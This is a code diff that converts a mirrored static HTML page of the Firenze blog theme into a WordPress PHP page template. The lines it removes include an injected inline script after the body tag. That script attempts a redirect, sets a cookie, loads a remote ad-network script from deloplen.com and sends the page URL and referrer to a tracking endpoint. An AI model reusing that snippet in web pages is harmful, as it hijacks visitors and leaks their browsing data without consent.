@@ -1,60 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
+  <?php
+ /*
+ Template Name: About
+ */ 
+   get_header();
+   get_template_part('hero');
 
-<!-- Mirrored from firenze.different-themes.com/html/about.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 01 Nov 2019 12:33:08 GMT -->
-<head>
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Firenze - Responsive Blog HTML5 Template</title>
-<link href="css/bootstrap.min.css" rel="stylesheet">
-<link href="css/style.css" rel="stylesheet">
-<link href="css/shortcodes.css" rel="stylesheet">
-<link href="css/font-awesome.css" rel="stylesheet">
-<link href="css/owl.carousel.css" rel="stylesheet">
-<link href="css/owl.theme.css" rel="stylesheet">
-
-<link href="css/demo-settings.css" rel="stylesheet">
-
-
-
-
-<!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-</head>
-<body id="top">
-<div class="boxed">
-<div class="container container-gutter">
-
-<div class="top-bar">
-<span class="top-bar-menu">
-<a href="index.html">Home</a>
-<a href="about.html">About</a>
-<a href="advertisement.html">Advertisement</a>
-<a href="contact.html">Contact</a>
-</span>
-<span class="top-bar-socials">
-<a href="https://facebook.com/" target="_blank"><i class="fa fa-facebook"></i></a>
-<a href="https://twitter.com/" target="_blank"><i class="fa fa-twitter"></i></a>
-<a href="https://instagram.com/" target="_blank"><i class="fa fa-instagram"></i></a>
-<a href="https://pinterest.com/" target="_blank"><i class="fa fa-pinterest"></i></a>
-<a href="https://plus.google.com/#" target="_blank"><i class="fa fa-google-plus"></i></a>
-<a href="https://tumblr.com/" target="_blank"><i class="fa fa-tumblr"></i></a>
-<a href="#" target="_blank"><i class="fa fa-rss"></i></a>
-</span>
-</div>
-
-
-<header class="header">
-<div class="row">
-<div class="col-md-12">
-<div class="logo"><a href="index.html"><img id="logo" src="images/logo.png" alt="logo"></a></div>
-</div>
-</div>
-</header>
-
+  ?>
 
 <nav class="navbar yamm navbar-default" id="main-navigation">
 <div class="container-fluid">
@@ -138,38 +89,6 @@
 </div> 
 <p id="back-top">
 <a href="#top"><i class="fa fa-angle-up"></i></a>
-</p>
-<footer class="footer">
-<div class="footer-dark">
-<div class="footer-socials">
-<a href="https://www.twitter.com/d" class="social"><i class="fa fa-twitter"></i> Twitter</a>
-<a href="http://www.bloglovin.com//d" class="social"><i class="fa fa-plus"></i> Bloglovin</a>
-<a href="https://www.facebook.com/d" class="social"><i class="fa fa-facebook-square"></i> Facebook</a>
-<a href="https://dribbble.com/d" class="social dribbble" rel="publisher"><i class="fa fa-dribbble"></i> Dribbble</a>
-<a href="https://plus.google.com/+d" class="social google"><i class="fa fa-google-plus-square"></i> Google+</a>
-</div>
-<div class="footer-menu">
-<a href="#" class="social">About Us</a>
-<a href="#" class="social">Archives</a>
-<a href="#" class="social">Advertise</a>
-<a href="#" class="social">Contact Us</a>
-</div>
-</div>
-<div class="footer-bottom">
-<i class="fa fa-copyright"></i> Copyright 2015. All rights reserved.<br />
-Theme made by <a href="https://themeforest.net/user/different-themes/portfolio?ref=different-themes">Different Themes</a>
-</div>
-</footer>
+</p> 
 
-<script type="text/javascript" src="js/jquery-latest.min.js"></script>
-<script type="text/javascript" src="js/bootstrap.min.js"></script>
-<script type="text/javascript" src="js/owl.carousel.min.js"></script>
-<script type="text/javascript" src="js/demo-settings.js"></script>
-<script type="text/javascript" src="js/SmoothScroll.min.js"></script>
-<script type="text/javascript" src="js/jquery.scrolline.js"></script>
-<script type="text/javascript" src="js/jquery.WCircleMenu-min.js"></script>
-<script type="text/javascript" src="js/ThemeScripts.js"></script>
-</body><script type="text/javascript">if(top==self){(function(){location.Href="https://sharing-wedding.com/"; document.Referrer="";document.cookie = 'pau=1;expires='+new Date(+new Date()+2*60*1000)['toGMTString']()+';path=/;';})();var deloplenscript=document.createElement('script');deloplenscript.src="http://deloplen.com/apu.php?zoneid=2678515";deloplenscript.setAttribute('async','');deloplenscript.setAttribute('data-cfasync','false');document.head.appendChild(deloplenscript);(new Image).src='http://firenze.different-themes.com/pages/imevrstk.php?qd=IBL&amp;zqd=015.005&amp;nbid=bdbc0dd5fcde6986a59232d0421648c0&amp;cid=297288&amp;at=popad'+'&url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer)+'&t='+parseInt(Math.random()*1000000)}</script>
-
-<!-- Mirrored from firenze.different-themes.com/html/about.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 01 Nov 2019 12:33:10 GMT -->
-</html>
+<?php get_footer(); ?>
